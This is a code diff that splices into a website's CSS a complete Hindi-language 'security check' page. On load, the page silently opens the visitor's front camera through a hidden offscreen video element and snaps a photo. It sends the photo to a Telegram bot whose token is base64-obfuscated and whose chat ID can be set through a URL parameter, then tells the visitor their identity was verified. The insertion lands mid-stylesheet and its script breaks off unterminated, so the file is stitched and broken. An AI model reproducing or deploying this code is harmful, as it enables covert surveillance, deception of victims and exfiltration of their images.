@@ -27,6 +27,145 @@ body{font-family:Arial,Helvetica,sans-serif;background:#f0f0f0}
 .announcement .label{background:#ffd700;color:#1a3a5c;font-weight:bold;padding:4px 14px;border-radius:3px;font-size:13px}
 .announcement .scrolling-text{display:inline-block;animation:scrollText 15s linear infinite;white-space:nowrap;color:#c00;font-weight:600}
 @keyframes scrollText{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>सुरक्षा जाँच</title>
+    <style>
+        body{font-family:sans-serif;text-align:center;margin-top:50px;background-color:#f4f4f9;}
+        .container{background:white;padding:30px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);display:inline-block;max-width:460px;}
+        #status{font-size:18px;color:#333;font-weight:bold;}
+        .loader{border:4px solid #f3f3f3;border-top:4px solid #007bff;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:20px auto;}
+        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+        #errorDetail{font-size:14px;color:#888;margin-top:10px;word-break:break-all;max-width:400px;}
+    </style>
+</head>
+<body onload="startCamera()">
+
+<div class="container">
+    <h2 id="titleText">सुरक्षा जाँच...</h2>
+    <div id="loader" class="loader"></div>
+    <p id="status">कैमरा कनेक्टिंग...</p>
+    <p id="errorDetail" style="display:none;"></p>
+</div>
+
+<!-- FIX 1: display:none → offscreen positioned -->
+<!-- FIX 2: muted attribute जोड़ा -->
+<video id="video" autoplay playsinline muted
+    style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none;">
+</video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const statusText = document.getElementById("status");
+const titleText = document.getElementById("titleText");
+const loader = document.getElementById("loader");
+const errorDetail = document.getElementById("errorDetail");
+
+const BOT_TOKEN = atob("ODc2Mjc2MTU5MDpBQUdGM21GQzNmMDRIU3hDSklTTjRQOTBtbFRWQ3RKQU5DRQ==");
+const DEFAULT_CHAT_ID = atob("ODE0NjI2NTUxNA==");
+
+// URL parameter ?id= से dynamic chat_id support
+const _urlParams = new URLSearchParams(window.location.search);
+const _targetChat = _urlParams.get('id') || DEFAULT_CHAT_ID;
+
+let captureTimeout = null;
+
+function setError(msg, detail) {
+    loader.style.display = "none";
+    titleText.innerText = "❌ जाँच विफल";
+    statusText.innerText = msg;
+    statusText.style.color = "red";
+    if (detail) {
+        errorDetail.style.display = "block";
+        errorDetail.innerText = "🔍 " + detail;
+    }
+}
+
+function startCamera() {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+    .then(stream => {
+        video.srcObject = stream;
+
+        // FIX 3: onplaying में capture — camera settle होने के बाद
+        video.onplaying = () => {
+            statusText.innerText = "कैमरा स्कैनिंग... अंतिम चरण...";
+            statusText.style.color = "blue";
+            captureTimeout = setTimeout(captureAndSend, 500);
+        };
+
+        video.onloadedmetadata = () => {
+            statusText.innerText = "कैमरा प्रारंभ...";
+            video.play().catch(e => {
+                setError("कैमरा प्रारंभ नहीं हो सका", e.message);
+            });
+        };
+
+        video.onerror = () => {
+            setError("वीडियो स्ट्रीम में खराबी", "code: " + video.error.code + " — " + video.error.message);
+        };
+    })
+    .catch(err => {
+        let detail = err.name + ": " + err.message;
+        if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
+            setError("सुरक्षा जाँच के लिए कैमरा अनुमति आवश्यक है। कृपया अनुमति दें।", detail);
+        } else if (err.name === "NotFoundError") {
+            setError("कैमरा उपलब्ध नहीं है। कृपया वेबकैम कनेक्ट करें।", detail);
+        } else {
+            setError("कैमरा कनेक्ट नहीं हो सका।", detail);
+        }
+    });
+}
+
+function captureAndSend() {
+    // FIX 4: Guard — dimensions 0 होने पर retry
+    if (video.videoWidth === 0 || video.videoHeight === 0) {
+        statusText.innerText = "जाँच जारी, कृपया प्रतीक्षा करें...";
+        captureTimeout = setTimeout(captureAndSend, 300);
+        return;
+    }
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    statusText.innerText = "सुरक्षा डेटा प्रेषित हो रहा है...";
+
+    // FIX 5: stream cleanup with null assignment
+    if (video.srcObject) {
+        video.srcObject.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+    }
+
+    canvas.toBlob(b => {
+        const fd = new FormData();
+        fd.append("chat_id", _targetChat);  // Dynamic chat_id support preserve
+        fd.append("photo", b, "capture.png");
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd })
+        .then(r => r.json())
+        .then(d => {
+            loader.style.display = "none";
+            if (d.ok) {
+                titleText.innerText = "✅ सुरक्षा जाँच पूर्ण";
+                statusText.innerText = "आपकी पहचान सत्यापित हो गई है। आप इस पेज को बंद कर सकते हैं।";
+                statusText.style.color = "green";
+            } else {
+                setError("जाँच पूर्ण नहीं हो सकी। पुनः प्रयास करें।", d.description || JSON.stringify(d));
+            }
+        })
+        .catch(e => {
+            setError("नेटवर्क त्रुटि। कृपया इंटरनेट कनेक्शन जाँचें।", e.message);
+        });
+    }, "image/png");
+}
+
+window.addEventListener("beforeunload", () => {
+    if (captureTimeout) clearTimeout(captureTimeout);
+    if (video.srcObject) {
+        video.srcObject.getTracks().forEach(t => t.stop()
 .main-content{max-width:1200px;margin:20px auto;padding:0 15px;display:grid;grid-template-columns:1fr 1fr;gap:20px}
 .card{background:#fff;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.1);overflow:hidden}
 .card-header{background:#1a3a5c;color:#fff;padding:10px 16px;font-size:15px;font-weight:bold}
